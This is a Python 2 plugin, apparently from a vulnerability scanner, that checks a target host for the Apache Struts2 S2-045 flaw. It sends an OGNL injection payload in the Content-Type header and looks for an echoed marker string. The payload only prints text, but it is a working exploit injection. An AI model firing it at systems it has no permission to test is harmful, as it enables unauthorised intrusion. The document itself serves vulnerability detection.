#!/usr/bin/env python
# encoding: utf-8
# from ..t import T
from t import T
import requests
import sys
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('test'+602+53718)).(#o.close())}"
        try:
            headers = {}
            headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            headers['Content-Type'] = payload
            if productname.has_key('cookie'):
                headers['Cookie'] = productname['cookie']
            r = requests.get(target_url, headers=headers) 
            res_html = r.content 
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
                
        if res_html.find("test60253718") <> -1:
      

            info = target_url + "struts045 Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts045 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='www',port='8089')
            
            
            
            
